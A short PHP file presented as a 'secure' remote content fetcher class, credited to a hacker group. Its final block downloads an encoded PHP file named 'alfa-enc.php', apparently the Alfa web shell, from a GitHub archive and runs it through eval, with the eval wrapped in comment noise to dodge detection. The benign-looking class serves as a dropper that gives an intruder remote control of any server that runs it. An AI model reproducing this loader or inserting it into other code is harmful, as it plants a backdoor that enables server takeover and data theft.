<?php
/**
 * Class RemoteContentFetcher
 * Handles secure remote content fetching with proper validation
 * By NuLz | Haxorstars
 * github.com/haxorstars
 */
class RemoteContentFetcher {
    private $url;
    private $options;
    
    /**
     * Constructor
     * @param string $url Remote URL to fetch
     */
    public function __construct(string $url) {
        $this->url = filter_var($url, FILTER_VALIDATE_URL);
        $this->options = [
            'ssl_verify' => true,
            'timeout' => 30,
            'user_agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0'
        ];
    }
    
    /**
     * Set custom cURL options
     * @param array $options
     */
    public function setOptions(array $options): void {
        $this->options = array_merge($this->options, $options);
    }
    
    /**
     * Fetch content from remote URL
     * @return string|false
     * @throws Exception
     */
    public function fetch() {
        if (!$this->url) {
            throw new Exception('Invalid URL provided');
        }
        
        try {
            $ch = curl_init();
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $this->url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => $this->options['ssl_verify'],
                CURLOPT_TIMEOUT => $this->options['timeout'],
                CURLOPT_USERAGENT => $this->options['user_agent']
            ]);
            
            $content = curl_exec($ch);
            $error = curl_error($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            curl_close($ch);
            
            if ($error) {
                throw new Exception("cURL Error: $error");
            }
            
            if ($httpCode !== 200) {
                throw new Exception("HTTP Error: $httpCode");
            }
            
            return $this->validateContent($content);
            
        } catch (Exception $e) {
            error_log("RemoteContentFetcher Error: " . $e->getMessage());
            throw $e;
        }
    }
    
    /**
     * Validate fetched content
     * @param string $content
     * @return string
     */
    private function validateContent($content) {
        if (empty($content)) {
            throw new Exception('Empty content received');
        }
        
        return $content;
    }
}

try {
    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa-enc.php');
    $fetcher->setOptions([
        'timeout' => 60,
        'ssl_verify' => true
    ]);
    
    $content = $fetcher->fetch();
    /*555555*/eval/*555555*/("?>".$content)/****#****/;
    
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
?>
